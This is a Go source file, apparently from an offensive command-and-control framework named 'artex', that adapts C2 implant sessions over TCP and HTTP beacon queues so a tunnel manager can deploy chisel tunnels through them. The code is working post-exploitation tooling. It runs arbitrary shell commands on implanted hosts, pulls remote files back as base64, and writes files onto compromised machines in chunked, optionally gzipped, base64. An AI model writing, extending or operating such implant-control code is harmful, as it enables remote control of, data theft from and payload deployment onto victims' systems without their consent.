package server

// C2 会话适配器：把 C2 的 TCP/HTTP 会话包装成 session.Session，
// 让 tunnel.Manager 无需 session.Registry 也能经 C2 控制通道部署 chisel 隧道。
// 控制面：TCP 走 c2.Manager.Dispatch；HTTP 走 c2_tasks 队列 + beacon 领取。

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"github.com/Autumn-27/artex/c2"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

type c2SessionAdapter struct {
	rt       *c2Runtime
	sess     *db.C2Session
	listener string // tcp / http
}

// c2TunnelSession 返回一个可用于 tunnel.Manager 的 C2 会话适配器。
func (s *Server) c2TunnelSession(ctx context.Context, id int64) (session.Session, error) {
	return newC2TunnelSession(s.c2rt(), ctx, id)
}

func newC2TunnelSession(rt *c2Runtime, ctx context.Context, id int64) (session.Session, error) {
	if rt == nil {
		return nil, fmt.Errorf("C2 运行时不可用")
	}
	sess, err := rt.store.GetSession(ctx, id)
	if err != nil {
		return nil, fmt.Errorf("读取 C2 会话失败: %w", err)
	}
	if sess == nil {
		return nil, fmt.Errorf("C2 会话 %d 不存在", id)
	}
	if sess.Status != db.C2SessionActive {
		return nil, fmt.Errorf("C2 会话 %d 不在线（status=%s）", id, sess.Status)
	}
	l, err := rt.store.GetListener(ctx, sess.ListenerID)
	if err != nil || l == nil {
		return nil, fmt.Errorf("C2 会话 %d 的监听器不存在", id)
	}
	if l.Kind == db.C2ListenerKindTCP {
		if _, ok := rt.mgr.Get(sess.ImplantUUID); !ok {
			return nil, fmt.Errorf("C2 TCP 会话 %s 不在 Manager 在线列表", sess.ImplantUUID)
		}
	}
	return &c2SessionAdapter{rt: rt, sess: sess, listener: l.Kind}, nil
}

func (a *c2SessionAdapter) ID() int64    { return a.sess.ID }
func (a *c2SessionAdapter) Kind() string { return "c2_" + a.listener }

func (a *c2SessionAdapter) Test(ctx context.Context) error {
	out, _, err := a.Exec(ctx, "echo __c2tunnel_test__", 30*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(out, "__c2tunnel_test__") {
		return fmt.Errorf("C2 会话探针回显异常: %s", clipC2Text(out, 200))
	}
	return nil
}

func (a *c2SessionAdapter) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	switch a.listener {
	case db.C2ListenerKindTCP:
		res, err := a.rt.mgr.Dispatch(ctx, a.sess.ImplantUUID, &c2.Task{
			Kind: "exec", Args: cmd, Timeout: int(timeout.Seconds()),
		}, timeout)
		if err != nil {
			return "", "", fmt.Errorf("C2 TCP exec: %w", err)
		}
		out := res.Output
		if res.Err != "" && out == "" {
			out = res.Err
		}
		if res.ExitCode != 0 {
			return out, "", fmt.Errorf("C2 TCP 命令退出码 %d: %s", res.ExitCode, clipC2Text(out, 300))
		}
		return out, "", nil
	case db.C2ListenerKindHTTP:
		tid, err := a.rt.store.CreateTask(ctx, a.sess.ID, "exec", cmd, "tunnel")
		if err != nil {
			return "", "", fmt.Errorf("C2 HTTP 任务入队失败: %w", err)
		}
		deadline := time.Now().Add(timeout)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			task, gerr := a.rt.store.GetTask(ctx, tid)
			if gerr != nil {
				return "", "", fmt.Errorf("C2 HTTP 任务读取失败: %w", gerr)
			}
			if task != nil {
				switch task.Status {
				case db.C2TaskSuccess:
					return task.Output, "", nil
				case db.C2TaskFailed:
					msg := task.Error
					if msg == "" {
						msg = task.Output
					}
					return task.Output, "", fmt.Errorf("C2 HTTP 任务失败: %s", clipC2Text(msg, 300))
				}
			}
			if time.Now().After(deadline) {
				return "", "", fmt.Errorf("C2 HTTP exec 超时(%s)", timeout)
			}
			select {
			case <-ctx.Done():
				return "", "", ctx.Err()
			case <-ticker.C:
			}
		}
	}
	return "", "", fmt.Errorf("未知 C2 监听器类型 %q", a.listener)
}

func (a *c2SessionAdapter) ReadFile(ctx context.Context, path string) ([]byte, error) {
	out, _, err := a.Exec(ctx, "base64 -w0 "+shellQuoteC2(path), 60*time.Second)
	if err != nil {
		return nil, err
	}
	raw, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(out))
	if derr != nil {
		return nil, fmt.Errorf("C2 会话读取文件 base64 解码失败: %w", derr)
	}
	return raw, nil
}

func (a *c2SessionAdapter) WriteFile(ctx context.Context, path string, data []byte) error {
	const chunk = 64 * 1024
	payload := data
	tmp := path
	compressed := false
	if len(data) > 1<<20 {
		var buf bytes.Buffer
		zw := gzip.NewWriter(&buf)
		if _, err := zw.Write(data); err == nil && zw.Close() == nil && buf.Len() < len(data) {
			payload = buf.Bytes()
			tmp = path + ".gz"
			compressed = true
		}
	}
	dir := tmp
	if i := strings.LastIndex(dir, "/"); i > 0 {
		dir = dir[:i]
	} else {
		dir = "."
	}
	if _, _, err := a.Exec(ctx, "mkdir -p "+shellQuoteC2(dir), 30*time.Second); err != nil {
		return err
	}
	for off := 0; off < len(payload); off += chunk {
		end := off + chunk
		if end > len(payload) {
			end = len(payload)
		}
		enc := base64.StdEncoding.EncodeToString(payload[off:end])
		op := ">>"
		if off == 0 {
			op = ">"
		}
		cmd := "printf %s '" + enc + "' | base64 -d " + op + " " + shellQuoteC2(tmp)
		if _, _, err := a.Exec(ctx, cmd, 120*time.Second); err != nil {
			return err
		}
		if len(payload) == 0 {
			break
		}
	}
	if compressed {
		if _, _, err := a.Exec(ctx, "gzip -dc "+shellQuoteC2(tmp)+" > "+shellQuoteC2(path)+" && rm -f "+shellQuoteC2(tmp), 120*time.Second); err != nil {
			return err
		}
	}
	return nil
}

func (a *c2SessionAdapter) Close(context.Context) error { return nil }

func shellQuoteC2(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

func clipC2Text(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
